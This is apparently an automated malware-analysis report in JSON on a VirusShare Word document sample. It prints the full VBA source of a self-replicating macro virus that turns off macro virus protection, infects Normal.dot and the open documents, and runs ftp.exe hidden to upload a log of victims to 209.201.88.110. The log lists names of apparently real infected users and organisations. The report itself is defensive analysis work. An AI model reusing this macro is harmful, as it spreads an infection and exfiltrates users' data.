{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "AddFromString": "May attempt to modify the VBA code",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Chr": "May attempt to obfuscate specific str",
            "Document_Close": "Runs when the Word document is closed",
            "Document_Open": "Runs when the Word or Publisher document is opened",
            "Open": "May open a file",
            "Output": "May write to a file",
            "Print #": "May write to a file",
            "Shell": "May run an executable file or a system command",
            "System": "May run an executable file or a system command on a Mac",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code",
            "Write": "May write to a file",
            "Xor": "May attempt to obfuscate specific str",
            "codemodule": "May attempt to modify the VBA code",
            "command": "May run PowerShell commands",
            "put": "May write to a file",
            "vbHide": "May run an executable file or a system command"
        },
        "macro": "Private Sub Document_Close()\n\nOn Error Resume Next\n\nConst Marker = \"<- this is a marker!\"\n\n'Declare Variables\nDim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean\nDim ad, nt As Object\nDim OurCode, UserAddress, LogData, LogFile As String\n\n'Initialize Variables\nSet ad = ActiveDocument.VBProject.VBComponents.Item(1)\nSet nt = NormalTemplate.VBProject.VBComponents.Item(1)\n\nDocumentInfected = ad.codemodule.Find(Marker, 1, 1, 10000, 10000)\nNormalTemplateInfected = nt.codemodule.Find(Marker, 1, 1, 10000, 10000)\n\n\n'Switch the VirusProtection OFF\nOptions.VirusProtection = False\n\n\n  If (Day(Now()) = 1) And (System.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\MS Setup (ACME)\\User Info\", \"LogFile\") = False) Then\n  \n    If DocumentInfected = True Then\n      LogData = ad.codemodule.Lines(1, ad.codemodule.CountOfLines)\n    ElseIf NormalTemplateInfected = True Then\n      LogData = nt.codemodule.Lines(1, nt.codemodule.CountOfLines)\n    End If\n    \n    LogData = Mid(LogData, InStr(1, LogData, \"' Log\" & \"file -->\"), Len(LogData) - InStr(1, LogData, \"' Log\" & \"file -->\"))\n    \n    For i = 1 To 4\n      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)\n    Next i\n    LogFile = \"C:\\hsf\" & LogFile & \".sys\"\n    \n    Open LogFile For Output As #1\n    Print #1, LogData\n    Close #1\n    \n    Open \"c:\\netldx.vxd\" For Output As #1\n    Print #1, \"o 209.201.88.110\"\n    Print #1, \"user anonymous\"\n    Print #1, \"pass itsme@\"\n    Print #1, \"cd incoming\"\n    Print #1, \"ascii\"\n    Print #1, \"put \" & LogFile\n    Print #1, \"quit\"\n    Close #1\n    \n    Shell \"command.com /c ftp.exe -n -s:c:\\netldx.vxd\", vbHide\n    \n    System.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\MS Setup (ACME)\\User Info\", \"LogFile\") = True\n    \n  End If\n\n\n'Make sure that some conditions are true before we continue infecting anything\nIf (DocumentInfected = True Xor NormalTemplateInfected = True) And    (ActiveDocument.SaveFormat = wdFormatDocument Or    ActiveDocument.SaveFormat = wdFormatTemplate) Then\n   \n   \n  'Infect the NormalTemplate\n  If DocumentInfected = True Then\n  \n    SaveNormalTemplate = NormalTemplate.Saved\n  \n    OurCode = ad.codemodule.Lines(1, ad.codemodule.CountOfLines)\n\n    \n    'Write a log file of this NormalTemplate infection\n    For i = 1 To Len(Application.UserAddress)\n      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then\n        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then\n          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)\n        End If\n      Else\n        UserAddress = UserAddress & Chr(13) & \"' \"\n      End If\n    Next i\n\n    OurCode = OurCode & Chr(13) &               \"' \" & Format(Time, \"hh:mm:ss AMPM - \") &                      Format(Date, \"dddd, d mmm yyyy\") & Chr(13) &               \"' \" & Application.UserName & Chr(13) &               \"' \" & UserAddress & Chr(13)\n\n\n    nt.codemodule.deletelines 1, nt.codemodule.CountOfLines\n    nt.codemodule.AddFromString OurCode\n    \n    If SaveNormalTemplate = True Then NormalTemplate.Save\n    \n  End If\n\n\n  'Infect the ActiveDocument\n  If NormalTemplateInfected = True And      (Mid(ActiveDocument.FullName, 2, 1) = \":\" Or      ActiveDocument.Saved = False) Then\n  \n    SaveDocument = ActiveDocument.Saved\n    \n    OurCode = nt.codemodule.Lines(1, nt.codemodule.CountOfLines)\n\n    ad.codemodule.deletelines 1, ad.codemodule.CountOfLines\n    ad.codemodule.AddFromString OurCode\n    \n    If SaveDocument = True Then ActiveDocument.Save\n      \n  End If\n  \n    \nEnd If\n\nEnd Sub\n\n' Logfile -->\n\n' 09:08:36  - Saturday, 28 Nov 1998\n' SPo0Ky\n' Blue Planet\n'\n\n\n\n' 02:50:31 PM - Saturday, 28 Nov 1998\n' MARK B. SEAY\n'\n\n\n\n' 08:04:45 AM - Friday, 4 Dec 1998\n' UPS\n'\n\n\n\n' 11:43:35 AM - Thursday, 17 Dec 1998\n' WRO\n'\n\n\n\n' 12:04:46 PM - Wednesday, 23 Dec 1998\n' BCBSA\n'\n\n\n\n' 11:32:13 AM - Thursday, 24 Dec 1998\n' BCBSA\n'\n\n\n\n' 11:43:52 AM - Monday, 28 Dec 1998\n' BCBSA\n'\n\n\n\n' 12:03:48 PM - Wednesday, 6 Jan 1999\n' Tricia\n'\n\n\n\n' 11:45:55 AM - Thursday, 14 Jan 1999\n' Debra C. Hopkinson\n'\n\n\n\n' 09:27:34 AM - Friday, 15 Jan 1999\n' Rajeev Duggirala\n'\n\n\n\n' 02:35:40 PM - Thursday, 28 Jan 1999\n' Krishna Devulapalli\n'\n\n\n\n' 09:17:55 PM - Thursday, 4 Feb 1999\n' Muralidharan Swaminathan\n'\n\n\n\n' 02:49:41 PM - Monday, 8 Feb 1999\n' cyber\n'\n\n\n\n' 08:59:15 PM - Monday, 15 Feb 1999\n' xx\n'\n\n\n\n' 01:02:02 PM - Friday, 19 Feb 1999\n' RAMESH\n'\n\n\n\n' 06:49:26 PM - Monday, 22 Feb 1999\n' itm2\n'\n\n\n\n' 01:22:19  - Sunday, 21 Feb 1999\n' WIN\n'\n\n\n\n' 10:00:14  - Saturday, 27 Feb 1999\n' M.ROHINI\n'\n\n\n\n' 05:01:52  - Tuesday, 14 Mar 2000\n' M.ROHINI\n'\n\n\n\n' 04:33:33 PM - Friday, 19 Mar 1999\n'\n'\n\n\nPrivate Sub Document_Open()\n\nEnd Sub\n\n' 05:05:17 PM - Wednesday, 14 Apr 1999\n' Mr.PRASANNA\n'\n\n\n\n' 06:46:19 PM - Tuesday, 5 Oct 1999\n' N.SOORIYA MOORTHY\n'\n\n\n\n' 10:38:11 AM - Sunday, 14 Nov 1999\n' SIVAA\n'\n\n\n\n"
    },
    "filename": "VirusShare_24c18f97e9fa616145d9b9ffa821c886",
    "filesize": 44032,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.10, Code page: 1252, Title: Warning, Author: Niccol Rigacci, Template: Normal.dot, Last Saved By: Niccol Rigacci, Revision Number: 2, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Mon Sep 11 19:47:00 2000, Last Saved Time/Date: Mon Sep 11 19:47:00 2000, Number of Pages: 1, Number of Words: 6, Number of Characters: 34, Security: 0",
    "hashes": {
        "md5": "24c18f97e9fa616145d9b9ffa821c886",
        "sha1": "367158df5d07dae1e8e3c7d58e8350e27886221a",
        "sha256": "4ed42b4041e803c6a6c88c8cb21f1426a87d80642a86cf8ed491edf1ca4e1b4b"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbj",
            "Warning!",
            "This file is infected by a virus.",
            "PAGE  ",
            "PAGE  ",
            "&`#$",
            ". A!",
            "[-J\"",
            "CMB+*",
            "^`6I8Ho",
            "Z^F|V",
            ">9,k",
            ",Ho6*Z-",
            "`0o(",
            "`0o(",
            "`0o(",
            "`0o(",
            "`0o(",
            "`0o(",
            "`0o(",
            "`0o(",
            "`0o(",
            "`0o(",
            "^`6I",
            ">9,k",
            "@HP DeskJet 500",
            "LPT1:",
            "HPDSKJET",
            "HP DeskJet 500",
            "HP DeskJet 500",
            "MSUD",
            "HP DeskJet 500",
            "HP DeskJet 500",
            "MSUD",
            "HP DeskJet 500",
            "/]I&/]I&",
            "Warning",
            "Niccol Rigacci",
            "Normal.dot",
            "Niccol Rigacci",
            "Microsoft Word 8.0",
            "Warning",
            "Title",
            "_PID_GUID",
            "Project",
            "lE|9",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WINDOWS",
            "\\SYSTEM\\",
            "STDOLE2.",
            "TLB#",
            "tomation",
            "DNorma",
            "lDNBr",
            "!Offi",
            "cfO`f",
            "2DF8D04C",
            "-5BFA-101B-BDE5fAAd4",
            "gram Fil",
            "es\\Microsoft ",
            "MSO9.DLL",
            " 9.0 O",
            " Libra,ryC",
            "isDocume ntG",
            "\"h1s",
            ",!C\"B",
            "*\\CNormalrU",
            "Project1",
            "Project",
            "ThisDocument",
            "C:\\PROGRAM FILES\\COMMON FILES\\MICROSOFT SHARED\\VBA\\VBA6\\VBE6.DLL",
            "C:\\Program Files\\Microsoft Office\\Office\\MSWORD9.OLB",
            "Word",
            "C:\\WINDOWS\\SYSTEM\\STDOLE2.TLB",
            "stdole",
            "C:\\Program Files\\Microsoft Office\\Office\\MSO9.DLL",
            "Office",
            "Document",
            "Document_Close",
            "Document_Open",
            "HIq,",
            "HIC\u01e8",
            "lE|9",
            "<- this is a marker!",
            "Declare Variables",
            "Initialize Variables",
            "Switch the VirusProtection OFF",
            "HKEY_CURRENT_USER\\Software\\Microsoft\\MS Setup (ACME)\\User Info",
            "LogFile",
            "' Log",
            "file -->",
            "' Log",
            "file -->",
            "C:\\hsf ",
            ".sys",
            "c:\\netldx.vxd",
            "o 209.201.88.110",
            "user anonymous",
            "pass itsme@",
            "cd incoming",
            "ascii",
            "put  ",
            "quit",
            "command.com /c ftp.exe -n -s:c:\\netldx.vxd ",
            "HKEY_CURRENT_USER\\Software\\Microsoft\\MS Setup (ACME)\\User Info",
            "LogFile",
            "Make sure that some conditions are true before we continue infecting anything",
            " Tru",
            "Infect the NormalTemplate",
            "ed = T ",
            "alTe",
            "veDocu",
            "Write a log file of this NormalTemplate infection",
            "hh:mm:ss AMPM - $",
            "dddd, d mmm yyyy$",
            "ode ",
            "ime, \" ",
            "Infect the ActiveDocument",
            "empl",
            "tiveDo",
            " mmm y ",
            " Logfile -->3) &",
            " 09:08:36  - Saturday, 28 Nov 1998",
            " SPo0Ky",
            " Blue Planet",
            " 02:50:31 PM - Saturday, 28 Nov 1998",
            " MARK B. SEAY",
            " 08:04:45 AM - Friday, 4 Dec 1998",
            " UPS",
            " 11:43:35 AM - Thursday, 17 Dec 1998",
            " WRO",
            " 12:04:46 PM - Wednesday, 23 Dec 1998",
            " BCBSA",
            " 11:32:13 AM - Thursday, 24 Dec 1998",
            " BCBSA",
            " 11:43:52 AM - Monday, 28 Dec 1998",
            " BCBSA",
            " 12:03:48 PM - Wednesday, 6 Jan 1999",
            " Tricia",
            " 11:45:55 AM - Thursday, 14 Jan 1999",
            " Debra C. Hopkinson",
            " 09:27:34 AM - Friday, 15 Jan 1999",
            " Rajeev Duggirala",
            " 02:35:40 PM - Thursday, 28 Jan 1999",
            " Krishna Devulapalli",
            " 09:17:55 PM - Thursday, 4 Feb 1999",
            " Muralidharan Swaminathan",
            " 02:49:41 PM - Monday, 8 Feb 1999",
            " cyber",
            " 08:59:15 PM - Monday, 15 Feb 1999",
            " 01:02:02 PM - Friday, 19 Feb 1999",
            " RAMESH",
            " 06:49:26 PM - Monday, 22 Feb 1999",
            " itm2",
            " 01:22:19  - Sunday, 21 Feb 1999",
            " WIN",
            " 10:00:14  - Saturday, 27 Feb 1999",
            " M.ROHINI",
            " 05:01:52  - Tuesday, 14 Mar 2000",
            " M.ROHINI",
            " 04:33:33 PM - Friday, 19 Mar 1999",
            " 05:05:17 PM - Wednesday, 14 Apr 1999",
            " Mr.PRASANNA",
            " 06:46:19 PM - Tuesday, 5 Oct 1999",
            " N.SOORIYA MOORTHY",
            " 10:38:11 AM - Sunday, 14 Nov 1999",
            " SIVAA",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VGlobal!",
            "Spac",
            "Crea",
            "tabl",
            "Pre decla",
            "BExp",
            "Temp",
            "lateDeri",
            "$CustomlizC1P",
            "Sub _Cl",
            "n Error ",
            " Nex",
            "Const @Marker<",
            " is (a m",
            "l Vari",
            "Dim Save",
            "GInfec`ted, ",
            "As Boolean",
            "Code, Us",
            "erAddress, LogDfY",
            "gA9'Initi0aliz",
            "/Set abAct[1.VBProA",
            "Compon@",
            "s.Item(1S",
            "0%<=",
            " .c3mo",
            "dule.FinDd(c, 1",
            "O= n",
            "FSwitch|",
            "Firus",
            "tZion OF",
            "f (Day(N ow())",
            " And (Sys@M.@",
            "(\"\", \"HK",
            "EY_CURRE",
            "NT_USER\\ Softw\\M icros@",
            "S \\up (ACME)\\A? `(no!",
            "@?!>\"",
            " The`H  ",
            "ad))L`ines(`1",
            "CountOf",
            "64AuT",
            "Mid(",
            ",%'.",
            "\"'f\" ",
            "& \"2 -->$\")",
            ") ^-",
            "FiA@ To 4c",
            "\"s=&",
            "Int(8 * Rnd)`",
            "\"C:\\hsf",
            "p.sysA1",
            "OutpuB#1C",
            " S@y#;",
            "\t\"c:\\ne",
            "tldx.vxd",
            "\"o 20",
            "9.201.880.110",
            " anonym",
            "pass itsme@",
            "@cd incng",
            "ascii",
            "A H'",
            "( Shell \"\"",
            "manAem ",
            "/c ftp.e",
            "xe -n -s",
            ":$, vbHid`g3?K?A",
            "\u065fA= cr",
            "Ed32P",
            "Make sure`Pat socond cq H",
            " t| befo",
            "tinue",
            "1ming",
            "nysf",
            " ~X1AQq2!",
            "cS_]\"",
            "(liv&m0",
            " Or c",
            "yRRq",
            "  }p",
            "X.P3",
            "ia log rfof",
            "P,\tiB ns",
            " KLPApplicaAp~.",
            "Io1Lo",
            "L <> Chr(13",
            "1R\t lk",
            "W' F  ",
            "0jJ+",
            "(Timp\"hh",
            ":mm:0QAMPM j",
            ", d mmm y",
            "}deletel\u11a1",
            "e.FromtH",
            ";/90#",
            "QGB\u076c",
            "  9BF",
            "Ful\u060c, P",
            "N  ?N2 ",
            "rBT ",
            "09:@08:36 7Saturday",
            "80$v 1998",
            " SPo0Ky",
            "BlrPla",
            "2:50:831 r<",
            "RK B",
            ". SEAY",
            "' 08",
            ":04:45 A",
            "M - Frid",
            "ay, 4 De@c 1998",
            "11:4",
            "fThur",
            "lWROE",
            "jWedne",
            "7 BCBSA",
            "p32:13",
            "8MonS",
            "287T3:48AT6 Jan9",
            "O TriciaT45:5",
            "Debra C.",
            " Hopkins",
            "on\"09:27:34",
            "Rajeev DuggiralC02:40`",
            "Krishn",
            "aCvulapalli",
            "\"173lA",
            "4 FebAMu",
            "idhar",
            "Swaminat",
            "ha42:49:,41C$b8",
            " 8:59>:@>",
            "1:?02C",
            "RAMESH5",
            "6A(2\u0127",
            "itm2M",
            "29 Su",
            "10:0",
            "0:14",
            "M.RO",
            "HINI",
            "5:01:",
            "Mar 2000E",
            "4:33",
            "vate Sub",
            " Documen",
            "t_Open()EndA",
            "<5: ",
            "rgDr.PRAS(ANNK{0.6:",
            "5 Oc",
            "N.SOOR IYA M",
            "THK)38:11e#e0",
            "NovF",
            "YC.8\t",
            "lE|9",
            "Wordk",
            "Win16~",
            "Win32",
            "VBA6#",
            "Project1",
            "stdole`",
            "Project-",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Documentj",
            "Document_Close7\\",
            "MarkerS",
            "SaveDocumentd]",
            "SaveNormalTemplatel",
            "DocumentInfected",
            "NormalTemplateInfectedy",
            "ad~\\",
            "nto^",
            "OurCode=",
            "UserAddressF",
            "LogData(6",
            "LogFileG",
            "ActiveDocument\\",
            "VBProjectOh",
            "VBComponents",
            "Itemz",
            "NormalTemplateq",
            "codemodule",
            "Findn",
            "Options",
            "VirusProtectionoD",
            "Now%",
            "Systema",
            "PrivateProfileString[",
            "Lines",
            "CountOfLines!\\",
            "RndR",
            "ShellV",
            "vbHideW",
            "SaveFormat",
            "wdFormatDocument",
            "wdFormatTemplate",
            "Savedd",
            "Application*",
            "ChrK~",
            "Time",
            "UserName\\",
            "deletelines",
            "AddFromString",
            "Save",
            "FullName\u041e",
            "Document_Open",
            "ID=\"{F143FF8C-A8C7-11D3-9005-008048D94992}\"",
            "Document=ThisDocument/&H00000000",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "VersionCompatible32=\"393222000\"",
            "CMG=\"E3E157763E7A3E7A3E7A3E7A\"",
            "DPB=\"C6C4729BB69D989E989E98\"",
            "GC=\"A9AB1D5E1E5E1EA1\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=0, 0, 0, 0, C",
            "ThisDocument",
            "Documento Microsoft Word",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {
            "C:\\PROGRAM FILES\\COMMON FILES\\MICROSOFT SHARED\\VBA\\VBA6\\VBE6.DLL": "Library",
            "C:\\Program Files\\Microsoft Office\\Office\\MSO9.DLL": "Library",
            "C:\\Program Files\\Microsoft Office\\Office\\MSWORD9.OLB": "Autogen",
            "MSO9.DLL": "Library"
        },
        "fuzzing": {},
        "ip": [
            "209.201.88.110"
        ],
        "url": []
    },
    "time": "0:00:00.320803",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
